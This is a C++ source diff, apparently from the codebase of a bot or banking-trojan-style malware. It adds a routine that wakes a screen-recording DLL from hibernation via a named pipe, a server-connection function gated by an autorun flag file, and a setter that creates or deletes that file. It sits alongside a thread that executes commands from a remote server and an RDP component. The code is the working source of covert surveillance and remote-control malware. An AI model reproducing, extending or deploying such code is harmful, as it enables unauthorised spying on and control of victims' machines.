@@ -110,6 +110,7 @@ void TVideoRecDLL::InitializeApi()
 	LoadFunc(VideoRecFuncRunCmdExec,	(LPVOID&)RunCmdExec);
 	LoadFunc(VideoRecFuncSendLog,		(LPVOID&)SendLog);
 	LoadFunc(VideoRecFuncFolderIsUpload,(LPVOID&)FolderIsUpload);
+	LoadFunc(VideoRecOutOfHibernation,	(LPVOID&)OutOfHibernation);
 }
 
 //*********************************************************************************
@@ -532,6 +533,37 @@ bool SendLog( int server, const char* name, int code, const char* text )
 	return true;
 }
 
+struct MsgOutOfHibernation
+{
+	int numServer;
+};
+
+//отсылка лога на сервер
+static void WINAPI HandlerOutOfHibernation( LPVOID Data, PPipeMessage Message, bool &Cancel )
+{
+	if( Message->DataSize != sizeof(MsgOutOfHibernation) ) return;
+	MsgOutOfHibernation* msg = (MsgOutOfHibernation*)Message->Data;
+	VDRDBG( "Video", "OutOfHibernation" );
+	if( dll )
+		dll->OutOfHibernation( servers[msg->numServer] );
+}
+
+static DWORD WINAPI OutOfHibernationThread( void* msg )
+{
+	char buf[64];
+	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecOutOfHibernation).t_str(), (char*)msg, sizeof(MsgOutOfHibernation), 0 );
+	MemFree(msg);
+	return 0;
+}
+
+//вывод видео длл из спячки, работает в отдельно потоке, чтобы не было задержки
+void OutOfHibernation( int server )
+{
+	MsgOutOfHibernation* msg = (MsgOutOfHibernation*)MemAlloc( sizeof(MsgOutOfHibernation) );
+	msg->numServer = server;
+	RunThread( OutOfHibernationThread, msg );
+}
+
 DWORD WINAPI ProcessRDP(void*)
 {
 	typedef int (WINAPIV* PINIT) (char* config);
@@ -856,6 +888,7 @@ bool Start()
 			PIPE::RegisterMessageHandler( pipe, HandlerFolderIsUpload, 0, GetStr(VideoRecFuncFolderIsUpload).t_str(), 0 );
 
 			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );
+			PIPE::RegisterMessageHandler( pipe, HandlerOutOfHibernation, 0, GetStr(VideoRecOutOfHibernation).t_str(), 0 );
 
 			dll->RunCmdExec( servers[0], CallbackCmd ); //запуск потока выполнения команд от сервера
 
@@ -888,6 +921,32 @@ char* GetNamePipe( char* buf )
 	string s = GetStr(VideoRecPipe);
 	m_lstrcpy( buf, s.t_str() );
 	return buf;
+}
+
+void ConnectToServer( int server, bool autorun )
+{
+	bool connect = true;
+	if( autorun )
+	{
+		string autorunFlag = BOT::MakeFileName( 0, GetStr(VideoRecOutOfHibernation).t_str() );
+		if( !File::IsExists( autorunFlag.t_str() ) )
+			connect = false;
+	}
+	if( connect )
+	{
+		VDRDBG( "Video", "Соединение с сервером" );
+		UpdateSettings( 0, 0, 0, 24 * 60 );
+		OutOfHibernation(server);
+	}
+}
+
+void SetAutorun( bool set )
+{
+	string autorunFlag = BOT::MakeFileName( 0, GetStr(VideoRecOutOfHibernation).t_str() );
+	if( set )
+		File::WriteBufferA( autorunFlag.t_str(), 0, 0 );
+	else
+		pDeleteFileA( autorunFlag.t_str() );
 }
 
 }
